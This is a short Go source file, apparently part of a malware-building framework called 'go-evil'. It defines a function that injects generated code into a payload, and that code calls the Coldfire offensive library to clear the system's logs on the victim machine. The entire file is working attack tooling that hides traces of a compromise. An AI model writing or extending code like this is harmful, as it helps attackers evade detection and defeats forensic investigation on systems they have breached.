package logs

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Tries to clear known logs on the system
func Clear(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "clear_logs"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"err := coldfire.ClearLogs()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
